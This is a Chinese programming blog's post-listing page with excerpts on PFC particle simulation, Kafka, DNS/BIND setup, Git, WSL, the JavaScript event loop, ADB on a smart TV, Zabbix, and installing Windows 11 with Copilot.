<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79a981ba53403dfb5c4c7cdaabac55a9/" rel="bookmark">
			PFC_lobby_第二章10-12讲
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
FISH入门
随机数和随机生成颗粒
自带随机生成颗粒命令
回调函数
FISH入门 代码为pfc5.02d。
随机数和随机生成颗粒 new domain extent -10 10 set random 10001 ；把随机数数目设定之后，就可以得到一样的状态。 def test random=math.random.uniform loop n(1,50) random_x_pos=math.random.uniform x_pos=random_x_pos*10-5 ；范围在-5到5之间 random_y_pos=math.random.uniform y_pos=random_y_pos*10-5 ；范围在-5到5之间 random_rad=math.random.uniform rad=random_rad*0.2+0.1 ；半径范围为0.1到0.3 pos=vector(x_pos,y_pos) bp=ball.create(rad,pos) endloop end @test ；random=math.random.uniform 生成的数值在0-1之间 最大的数学库math.，math.random.uniform为均匀分布，math.random.guess为高斯分布。
自带随机生成颗粒命令 new domain extent -10 10 ;ball generate radius 0.1 0.3 number 50 box -5 5 wall generate box -5 5 ball distribute radius 0.1 0.3 porosity 0.7 box -5 5 ；指定孔隙率，有重叠量 ball attribute density 2e3 cmat default model linear property kn 1e6 ；指定密度，线性模型和刚度 cycle 1000 calm 5 ；calm把所有颗粒速度清零，能够尽可能减小初始重叠量对于运行的影响 ；每运行1000步就把速度清零5步 如果不进行calm，有的颗粒会跑到墙的外面。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79a981ba53403dfb5c4c7cdaabac55a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3128ab225fa3def2819727ae309c12dd/" rel="bookmark">
			PFC_第二章13到16讲
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
FISH入门
设置重力
跳跃结构
保存模型状态
测量圆的使用
FISH入门 设置重力 new domain extent -10 10 ball generate radius 0.1 0.3 number 50 box -5 5 wall generate box -5 5 ball attribute density 2e3 damp 0.7 ；分配密度和阻尼，damp阻尼系数耗散能量 cmat default model linear property kn 1e6 set gravity 9.8 ；一般默认竖向往下 ；set gravity 0 -9.8 矢量 cycle 200000 跳跃结构 每秒生成颗粒，共生成了8个颗粒。（重点理解）
new domain extent -10 10 cmat default model linear property kn 1e6 wall generate box -5 5 set gravity 9.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3128ab225fa3def2819727ae309c12dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ae13f55cfc3b4e59e1dd510f1e9f569/" rel="bookmark">
			PFCdocumentation_examples_tutorials
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Shallow Foundation
（1）建立模型
（2）在试样上方建立基础
（3）安装地基
（4）浅隧道开挖
（5）未加固隧道发生破坏
（6）引入衬砌加固隧道
Slip on a Fault
添加失效面
重力加载
改变故障摩擦角
Creation of a Synthetic Rock Mass (SRM) Specimen
创建完整岩石
组装砖块
添加裂缝
Shallow Foundation （1）建立模型 model new model domain extent (-1,25) (-6,6) (-6,20) model domain condition destroy wall generate box (0,24) (-5,5) (0,17) model random 10001 ball generate box (0,24) (-5,5) (0,10) number 2000 radius 0.40 contact cmat default type ball-ball model linearpbond ... property fric 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ae13f55cfc3b4e59e1dd510f1e9f569/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/020c03e510e5e29ecc4cca7f114bb8f2/" rel="bookmark">
			PFC_lobby_漏斗案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
漏斗案例
异形墙体生成
参数化建模
属性继承
分层染色
漏斗案例 重点在于参数化建模！！！
异形墙体生成 在生成墙体时，需要把底部封上。
直接坐标画图。
new domain extent -10 10 wall generate box -8 8 -5 0 onewall ；生成了一个整体的墙，共享一个墙的id号 wall delete range id 3 ；wall delete 是删除facet ；wall delete box 是删除墙命令 ；生成底部容器 wall create vertices -3 8 -3 2 ... ； -3 2 -1 0 ... -1 0 1 0 ... 1 0 3 2 ... 3 2 3 8 ；生成上方漏斗 ；根据节点来生成墙体，（-3,8）表示的是坐标，然后点和点之间形成连线（对于2d） 参数化建模 在建模开始定义一些参数，以便于之后调用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/020c03e510e5e29ecc4cca7f114bb8f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10bd5d52098673faf9ae40d9601a42d9/" rel="bookmark">
			PFC落石模拟
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Landslide/Rockfall simulation 山体滑坡/落石模拟
https://www.youtube.com/watch?v=WSa3909qYmI
模拟的目的在于通过导入团块的对象文件产生团块的二进制输出。
具体措施：
(i) 使用导入的几何体形成团块模板
(ii) 使用Taghavi(2011)定义的BubblePack算法来生成卵石分布
(iii) 使用Surfcalculate关键字从表面描述中计算惯性属性，假设密度均匀。
(iv) 理解为比率和距离提供的数值所产生的差异。
clump template + create keyword
①bubblepack关键字
通过Taghavi（2011）的Bubble Pack算法，指定创建团块模板卵石。
距离fdistance：根据Taghavi（2011）的定义，与光滑度的角度测量相对应的距离fdistance为0 &lt; fdistance &lt; 180。fdistance越大，卵石分布越平滑。
比率fratio ：块状模板中保留的最小和最大卵石的比率，0 &lt; fratio &lt; 1。
②surfcalculate关键字
表面计算，假设密度均匀，从面的描述中计算出惯性属性。
clump template + export s &lt;keyword ...&gt;
将块状模板s导出到文件。默认的文件名是{"clump.p2clp"（2D）；"clump.p3clp"（3D）}。如果没有指定nothrow，那么如果一个文件存在，就会被覆盖，否则就会出现错误。这是一个二进制文件，可以用import关键字重新加载。
skip-errors：表示如果存在指定的名为s的前一个文件，那么它将被覆盖。
model domain condition periodic
应用周期性边界条件。当球或团块的中心点落在模型域外时，它们会被传回模型的另一侧。
model domain condition destroy
销毁，删除落在模型域之外的球、团块和壁面，这些球、团块和壁面的单个外延（即紧紧包括物体的轴对齐的边界框）。
clump distribute ①porosity关键字
最终的孔隙率被设置为fporos。默认情况下，fporos={二维为0.16；三维为0.359}，对应于{二维为盘子；三维为球体}的紧密单分散包装的孔隙率。
②bin ibin
指定bin ibin的分布属性。可以指定任何数量的分布的半径范围、体积分数和分布类型。所有分布的体积分数之和必须为1。
volume-fraction fvfrac：这个分布中的团块的体积分数。所有分布的体积分数之和必须是1。
clump distribute porosity 0.15 diameter number-bins 6 box -30 30 -30 30 -30 30 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10bd5d52098673faf9ae40d9601a42d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f2ef228724d37139424443e8fbe3c31/" rel="bookmark">
			基于Kafka的大规模日志系统实现原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于Kafka的大规模日志系统的实现原理主要涉及以下几个方面：
数据收集：大规模日志系统首先需要从各个数据源收集大量的日志数据。数据源可以是应用程序、服务器、网络设备、传感器等。数据收集可以通过Kafka提供的Producer API实现，将日志数据发布到Kafka的主题中。
数据存储：Kafka采用分布式、持久化的方式存储数据。一旦数据被发布到Kafka的主题中，它将会被持久化保存，直到达到设定的保留时间或保留大小。这样可以确保数据不会丢失，并且可以支持数据的历史回放。
数据处理：Kafka本身只是一个消息队列，它不对数据进行处理。在大规模日志系统中，通常会有消费者（Consumer）来从Kafka的主题中拉取数据，并进行进一步的处理。数据处理可以包括数据过滤、转换、聚合、分析等操作，以便将原始的日志数据转换为有用的信息。
实时处理：大规模日志系统通常需要实时处理日志数据，以满足实时监控和分析需求。为了实现实时处理，可以使用Kafka提供的消费者组（Consumer Group）功能。消费者组允许多个消费者协同消费同一个主题的数据，从而提高处理能力和可用性。
扩展性：大规模日志系统需要处理大量的数据流，因此需要具备良好的扩展性。Kafka的分区和副本机制允许将数据分布在多个节点上，从而实现水平扩展。当数据量增加时，可以简单地增加更多的Kafka broker和消费者来分担负载。
容错性：Kafka具备高可用性和容错性。通过副本机制，数据能够冗余存储在多个节点上，即使某个节点出现故障，数据仍然可用。此外，Kafka使用ZooKeeper来管理broker状态和监控健康状态，从而实现故障检测和副本选举。
数据保留和归档：大规模日志系统通常需要保留历史数据一段时间，以便进行回溯和审计。Kafka允许设置数据的保留时间和保留大小，过期的数据会被自动清理。对于需要长期保留的数据，可以将数据归档到其他存储系统，如Hadoop HDFS或云存储。
总的来说，基于Kafka的大规模日志系统实现原理利用了Kafka的高性能、可靠性和可扩展性，通过数据收集、存储、处理和实时处理等环节，构建了一个高效、高可用的日志处理平台，广泛应用于日志监控、数据分析、运维管理等场景。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae481709b69aeec15f1f671aadca2c82/" rel="bookmark">
			《黑镜》S06-04
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		轮胎被扎破的时候，心里倒是有点儿高兴的。该！再加上又TM是黑的。
有些人靠伤害别人为自己牟利，不管原因有多么的冠冕堂皇，说到底，还不是自私为了挣那几块钱，就别装清高了。这种人的可恶在于特别擅长道德绑架，利用别人的善良来达成自己阴暗的目的。比如，我没钱没吃的，偷你不是正好，反正你也要捐钱做善事。
每一个程序员都知道，一个程序随着时间逐渐变坏并不是因为逻辑太复杂之类的原因，而是因为时间足够长了，偶尔放纵一下、降低标准的人增多了，这就像细菌让一个苹果腐烂：腐烂不是一天发生的，每天烂一点儿、每天烂一点儿。
社会也就是这样变烂的。
所以，每个人都要努力一点儿，不要让自己变烂，间接的也不要让社会变烂。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efb16ab8f9f13f9a9ae889611767ba17/" rel="bookmark">
			安装带有copilot的Windows11操作系统——超详细
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 准备工作Windows11系统镜像文件下载Rufus工具下载ViVeTool工具下载给磁盘分区 准备工作结束使用Rufus进行镜像烧入进行一些配置（如果没有显示copilot图标这个很重要） 结束 微软在最近发布了最近的Windows11操作系统版本，系统内置copilot工具。
什么是copilot？对我来说它就是一个系统级别的 new bing，new bing是内置的chat GPT-4的一个工具，可以说是十分不错的。
唯一的缺点就是没有大陆的版本，而且大陆的网络也是无法使用的（懂得都懂）。以下是copilot运行时的画面。
不说那么多了，下面直接开始教学。
准备工作 一台可以运行Windows11的电脑 Windows系统镜像 给磁盘分区 Rufus工具 U盘 手 Windows11系统镜像文件下载 进入Windows11下载页面——单击此处进入下载页面
进入页面我们下滑找到下载ISO镜像处
我们选择一个系统镜像下载，不要选择家庭版 ！！！
下一步选择语言可以选择简体中文
当为如下页面就可以下载了
如果你无法访问该页面，可以通过我分享的网盘进行下载——下载链接（企业微盘）
Rufus工具下载 Rufus——官网——网盘下载（密码：5i6p）
下载后得到如下文件
ViVeTool工具下载 这个工具在安装完成系统后可能会用到
原链接我找不到了时GitHub上的一个项目，网盘下载（蓝奏云，密码：f3d9）
给磁盘分区 分区我们可以使用系统的磁盘管理，也可以使用第三方工具
系统的磁盘管理容易崩溃，我这里使用第三方工具DiskGenius——网盘下载
我这里给磁盘分200GB出来做系统盘【就是C：盘】
提示有风险我们无视继续
提示我们要进入PE进行分区，查看是否有正在运行的程序。等无重要的正在运行的程序时就可以单击确认啦
等待
确认重启
这段时间不需要做任何事情，等待重启到系统后我们就可以看到刚才分的磁盘分区
准备工作结束 使用Rufus进行镜像烧入 打开Rufus工具
我们将显示USB外置硬盘勾选这样我们就能看到我们的U盘了
勾选后我们选择ISO镜像文件
其余默认即可。我们现在开始烧入。烧入会清除U盘中的所有数据请注意备份
单击开始后还会弹出一个窗口我们按照自己的需求选择
剩下的都按确认
等待进度条跑完U盘介质就安装好了
我们可以在U盘中找到一个exe文件打开
将复选框取消后下一步
剩下的步骤可以看我的——这个博客给另一台电脑安装Windows系统（10/11）或者 如何给电脑安装Windows双系统
进行一些配置（如果没有显示copilot图标这个很重要） 打开ViVeTool工具，里面有一个exe的执行文件打开
打开后会弹出一个cmd窗口一下【很短暂】运行后重启即可（这个文件夹不建议删除）
如果你发现你打不开或者你打开显示无法使用可能时因为大陆的网络无法使用需要使用一些工具，这里不好说懂得都懂。当你重启后发现图标消失了，你可以尝试不关工具直接重启（亲测有效）
当你打开edge中的new bing图标时会打开copilot
文章到这就结束了
结束 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/136c74615c87de54fe1b1d67471d8ac6/" rel="bookmark">
			Git工具安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Git 工具安装 1. 下载Git安装包2. 安装Git工具3. 简单的使用配置用户名 1. 下载Git安装包 打开官网 https://git-scm.com/downloads点击下载 2. 安装Git工具 右击以管理员身份运行
![在这里插入图片描述](https://img-blog.csdnimg.cn/9a99a73d54824800bc87db64f71f7602.png
鼠标右击桌面发现多了2个东东就是安装成功了。 3. 简单的使用 第一次使用先配置你的Git用户名和邮箱。邮箱记得写真实的，有时候消息都是在邮箱提示的。鼠标右击桌面点击 Git Bash 这个打开。 配置用户名 git config --global user.name "your_name" 设置邮箱 git config --global user.email "xxxxxxxxx@qq.com" 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edf6caf12a245bf029dce021c5de2c77/" rel="bookmark">
			关于JavaScript的执行机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 JavaScript的执行机制JavaScript 的执行环境JavaScript 的事件循环JavaScript 的执行顺序JavaScript 的异步执行JavaScript 的执行上下文总结 JavaScript的执行机制 JavaScript 是一种单线程语言，即在同一时间只能执行一个任务。这意味着 JavaScript 代码的执行是按照一定的顺序进行的，而不是在多个任务之间进行切换的。JavaScript 的执行机制可以分为以下几个方面：
JavaScript 的执行环境 JavaScript 的执行环境分为主线程和任务队列两部分。主线程负责执行任务，而任务队列则用于存储待执行的任务。当主线程完成一个任务后，它会从任务队列中取出下一个任务并执行，这个过程被称为事件循环。
JavaScript 的事件循环 JavaScript 的事件循环是指 JavaScript 引擎不断地从任务队列中取出任务并执行的过程。在事件循环中，主线程会不断地从任务队列中取出任务，如果任务队列为空，则等待新的任务进入队列。
任务队列分为两种类型：宏任务和微任务。在事件循环中，主线程会先执行一个宏任务，然后执行所有微任务，再执行下一个宏任务。这个过程会一直持续下去，直到任务队列为空。
具体来说，JavaScript 中的宏任务包括以下几种：
整体代码块：JavaScript 代码本身就是一个宏任务，即整体代码块。定时器：使用 setTimeout() 和 setInterval() 方法创建的定时器任务。I/O 操作：例如 Ajax 请求、文件读取等异步操作。事件监听器：例如点击事件、键盘事件等。 而微任务包括以下几种：
Promise.then() 方法的回调函数MutationObserver 的回调函数process.nextTick() 方法的回调函数 在事件循环中，当下一个宏任务执行完毕后，主线程会立即执行所有微任务，然后再执行下一个宏任务。微任务会优先于下一个宏任务执行，者意味着微任务可以在下一个宏任务之前更新视图或执行一些重要的操作，从而提高代码的性能和用户体验。
JavaScript 的执行顺序 JavaScript 的执行顺序是由事件循环决定的。当任务进入任务队列时，它被添加到队列的末尾。当主线程空闲时，它会从队列的头部取出一个任务并执行。
具体来说，当一个任务被添加到任务队列中时，它并不会立即执行。相反，它会等待主线程执行完当前的任务，然后再被执行。这意味着任务的执行顺序可能与它们被添加到任务队列中的顺序不同。任务的执行顺序可能因为事件的触发和任务的添加顺序而发生变化。任务的执行是按照事件循环的规则进行的，而不是严格按照任务添加到任务队列的顺序执行。
在事件循环中，当主线程执行一个宏任务时，它可能会创建一些微任务并将它们添加到微任务队列中。当主线程执行完当前的宏任务后，它会立即执行所有微任务，然后再执行下一个宏任务。这个过程会一直重复下去，直到任务队列为空。
JavaScript 的异步执行 JavaScript 使用回调函数和 Promise 对象等方式来实现异步执行。当我们执行一个异步操作时，主线程会继续执行下一个任务，而不会等待异步操作的完成。
当异步操作完成后，JavaScript 会将回调函数或 Promise 对象添加到微任务队列中，等待主线程执行。当主线程执行完当前的宏任务后，它会立即执行所有微任务，这样就能在异步操作完成之后立即执行回调函数或 Promise 对象的处理函数。
需要主要的是，JavaScript 的异步执行并不是多线程的。在 JavaScript 中，只有一个主线程，所有的任务都是在同一个线程中执行的。当我们执行耗时的任务时，如果该任务是同步的，则会阻塞主线程，导致页面失去响应；如果该任务是异步的，则主线程会继续执行下一个任务，而不会等待该任务完成。
JavaScript 的执行上下文 JavaScript 的执行上下文是指 JavaScript 引擎在执行代码时创建的一个执行环境，它包含了当前正在执行的代码的相关信息，例如变量、函数、作用域等。JavaScript 中的执行上下文分为以下三种类型：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/edf6caf12a245bf029dce021c5de2c77/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/496e800ad397a074d408729f97ab867b/" rel="bookmark">
			DNS服务器基本概念，和DNS服务器的搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基本概念 DNS服务器是一个关键的网络服务，它用于将易于记忆的域名映射到IP地址在互联网上，使用域名来标识和访问各种资源更方便，而不用记住复杂的IP地址。
域名（Domain Name）：域名是用于标识网络资源的人类可读的字符串。它通常由多个标签（如www、example、com）组成，每个标签之间用点号（.）分隔。域名提供了更友好的方式来访问互联网上的资源。
IP地址（Internet Protocol Address）：IP地址是网络设备的唯一标识符，用于在Internet上识别和定位设备。IP地址是一个由数字组成的标准化格式，通常以IPv4（如192.0.2.1）或IPv6（如2001:0db8:85a3:0000:0000:8a2e:0370:7334）表示。
域名解析（Domain Name Resolution）：域名解析是将域名转换为对应的IP地址的过程。当您在浏览器中键入域名时，DNS服务器负责将域名解析为相应的IP地址，使得网络数据能够正确地路由到目标服务器。
DNS服务器：DNS服务器是运行DNS服务的计算机，负责存储和管理域名与IP地址之间的映射关系。它可以是递归服务器或授权服务器。
递归服务器（Recursive Server）：递归服务器是终端用户设备（如计算机、手机）或ISP（Internet Service Provider）提供的服务器。当用户设备请求解析域名时，递归服务器会负责从根域名服务器开始递归地查询，并最终返回正确的IP地址给用户设备。
授权服务器（Authoritative Server）：授权服务器是存储特定域名和其对应IP地址的服务器。它们是DNS层次结构中域名信息的权威来源。例如，com域名的授权服务器存储了所有.com域名下的域名和IP地址的映射关系。
TTL（Time to Live）：TTL是域名解析结果在缓存中的存储时间。每次解析域名后，解析结果会被缓存在DNS服务器和客户端设备中，TTL定义了这个缓存的有效期。一旦TTL过期，下次查询将重新执行解析过程。
DNS查询类型 递归查询：一般客户机和本地DNS服务器之间属于递归查询，即当客户机向DNS服务器发出请求后,若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到最终的肯定或否定的结果后转交给客户机。此查询的源和目标保持不变,为了查询结果只需要发起一次查询。（不需要自己动手）
迭代查询：一般情况下(有例外)本地的DNS服务器向其它DNS服务器的查询属于迭代查询,如：若对方不能返回权威的结果，则它会向下一个DNS服务器(参考前一个DNS服务器返回的结果)再次发起进行查询，直到返回查询的结果为止。此查询的源不变,但查询的目标不断变化,为查询结果一般需要发起多次查询。(需要自己动手)
总结
递归查询：从客户端到本地名称服务器，一直以代理形式向其他DNS服务器发出查询请求，直到找到解析结果，然后返回给客户端。迭代查询：在DNS服务器之间的查询中，不断向其他DNS服务器发出请求，直到找到解析结果。 DNS软件bind DNS服务器软件：bind，powerdns，dnsmasq，unbound，coredns
bind：服务器
bind-libs：相关库
bind-utils: 客户端
bind-chroot: 安全包，将dns相关文件放至 /var/named/chroot/
bind软件的设置 (正向解析与主从备份) 主服务器设置 yum install bind -y #安装bind网站 我这里提前安装了
rpm -qc bind #查看bind的配置文件 vim /etc/named.conf #进入named.conf文件 注释掉第13行和第21行 vim /etc/named.rfc1912.zones #打开named.rfc1912.zones cd /var/named/ #进入/var/named文件夹 、 cp -a named.localhost xwm.cn.zone #复制named.localhost并重命名为xwm.cn.zone vim xwm.cn.zone #编辑xwm.cn.zone文件 systemctl start named #启动服务 可以用host来验证主服务器是否配置成功 如图，配置成功
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/496e800ad397a074d408729f97ab867b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97e1269cb2f2dbb9a5e1beda29e983db/" rel="bookmark">
			Gson：解析JSON为复杂对象：TypeToken
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求 通过Gson，将JSON字符串，解析为复杂类型。
比如，解析成如下类型：
Map&lt;String, List&lt;Bean&gt;&gt;
依赖（Gson） &lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;/dependency&gt; 解决方案 使用 TypeToken 来定义复杂类型。
Type type = new TypeToken&lt;复杂类型&gt;() {}.getType(); 代码示例 测试 package com.example.web.user; import java.lang.reflect.Type; import java.util.List; import java.util.Map; import com.example.util.FileUtils; import com.example.web.user.bean.User; import com.google.gson.Gson; import com.google.gson.reflect.TypeToken; /** * 测试：Gson解析字符串为复杂类型。 */ public class Test { public static void main(String[] args) { // 读取文件内容 String json = FileUtils.read("config/group_user.json"); // 转为需要的类型 Gson gson = new Gson(); Type type = new TypeToken&lt;Map&lt;String, List&lt;User&gt;&gt;&gt;() { }.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97e1269cb2f2dbb9a5e1beda29e983db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ad7302b07c5ec4b3534d5461b79523b/" rel="bookmark">
			红米电视 ADB 安装 app 报错 failed to authenticate xxx:5555
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开启电视开发者模式，允许安装未知来源应用及开启 ADB 调试电脑端下载 adb 工具 点击下载同一局域网的电脑使用 adb 工具连接（提前查看电视 IP）D:\adb&gt;adb connect 192.168.1.7 * daemon not running; starting now at tcp:5037 * daemon started successfully failed to authenticate to 192.168.1.7:5555 提示未授权D:\adb&gt;adb connect 192.168.1.7 already connected to 192.168.1.7:5555 再次连接，提示已连接D:\adb&gt;adb devices List of devices attached 192.168.1.7:5555 unauthorized 查看已连接设备，显示未授权D:\adb&gt;adb install 电视家.apk error: device unauthorized. This adb server's $ADB_VENDOR_KEYS is not set Try 'adb kill-server' if that seems wrong. Otherwise check for a confirmation dialog on your device.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ad7302b07c5ec4b3534d5461b79523b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/883920593ec1e72bcb69e14cd71dec69/" rel="bookmark">
			Zabbix网络拓扑配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、简介
网络拓扑功能是一项非常重要的功能，它可以直观展示网络设备主机状态及端口传输速率等指标信息，帮助运维人员快速发现和定位故障问题；Zabbix同样配备了强大的网络拓扑功能，如何使用Zabbix拓扑图功能创建一个公司网络拓扑图就显得尤为重要。
二、配置
1、新建拓扑图，点击新建按钮
2、配置网络拓扑图信息(所有字段信息都可以修改调整)
添加完成后，“拓扑图”菜单中点击新建的拓扑名称进入拓扑页。然后点击右上角“编辑拓扑图”按钮，进入到拓扑图编辑界面
3、添加已监控网络设备主机
4、如图操作添加多个设备后，设备间两两选择添加“链接”，按住ctrl选择两台网络设备，然后点击链路“添加”按钮即可。
编辑链路配置绑定触发器及指标标签
标签使用监控项数据有avg、last、min和max
5、更新拓扑图，看效果
三、首页配置仪表盘拓扑图
1、创建新仪表盘
2、添加卡片组件，选择拓扑图
拓扑展现效果如图所示。Zabbix目前不支持拓扑自动发现。
博客可能不能及时回复问题，技术问题欢迎加入交流。
具有丰富的模板资源及模板开发能力、项目落地管理经验分享欢迎加入交流
微信号:king_songax
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44695845abfa1d3cfba80b64097a70cd/" rel="bookmark">
			Windows安装子系统Linux
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows安装子系统(Linux ubuntu） 安装条件步骤1.安装WSL命令2.设置Linux用户名和密码3.写个简单的.c程序看看4.如何互传文件 安装条件 Windows 10版本2004及更高的版本才能安装。
步骤 1.安装WSL命令 我们可以使用WSL来安装子系统 Linux ubuntu(默认是这个)。
调出终端 我们输出cmd 然后以管理员身份运行。输入命令 wsl --install 安装 WSL。 2.设置Linux用户名和密码 这个安装完 WSL，我这边是重启了电脑就自动给我弹出了ubuntu的终端了，或者你不重启电脑直接输出 wsl 命令进入ubuntu 然后让我设置用户名和密码，记得你写密码的时候 是不会显示出来的。
3.写个简单的.c程序看看 写个.c程序 vim a.c
编译程序 gcc a.c
提示没有这个gcc，安装一下 sudo apt install gcc
重新编译 成功生成a.out了
运行 ./a.out
全过程:
cyang@PC-20230531P:~$ vim a.c cyang@PC-20230531P:~$ cyang@PC-20230531P:~$ gcc a.c Command 'gcc' not found, but can be installed with: sudo apt install gcc cyang@PC-20230531P:~$ sudo apt install gcc cyang@PC-20230531P:~$ gcc a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44695845abfa1d3cfba80b64097a70cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/952f91a63ce133a031f531dd7d7b018c/" rel="bookmark">
			解决mac上 vs code 在debugging时无法输入的办法（c&#43;&#43;）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一：
1.打开launch.json，修改其中的external console值为true（原来应该是false）
2.回到cpp文件debug，此时会调用外部的终端（而非vs code的 integrated terminal），在mac的终端中输入，enter，然后vs code 可以继续debug
这种方法会造成在运行c/c++文件时同样在外部终端中运行，而非vs code的融合终端
如果装了code runner且设置coderunner在integratedTerminal中运行，launch.json中的更改不会影响code runner的设置，即coderunner仍然在Integrated Terminal中运行
方法二
https://youtu.be/wKjFVyDbSpA 视频讲解相当清晰，此处不再赘述
这个方法更加优雅，不像方法一那样曲折
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95f6cce92ef012723dcffb02284d4705/" rel="bookmark">
			如何将markdown转为pdf、html、jpg格式？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Markdown是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML文档。
我一般使用vscode来写作开发文档，有时候需要把markdown文档导出为其他格式，如：html，pdf或jpg，就需要安装其他插件十分麻烦，后来看到有在线转换的工具，直接拖markdown文件就可以在线转换，还挺方便的。
markdown转html：markdown在线转html - www.strerr.com
markdown转pdf：markdown在线转pdf - www.strerr.com
markdown转jpg：markdown在线转jpg - www.strerr.com
如下是转换pdf效果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/103124e1aff095bdca245b592a4a9eb7/" rel="bookmark">
			计算机毕业设计springboot快递仓库管理系统502yr9【附源码&#43;数据库&#43;部署&#43;LW】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本项目包含程序+源码+数据库+LW+调试部署环境，文末可获取一份本项目的java源码和数据库参考。
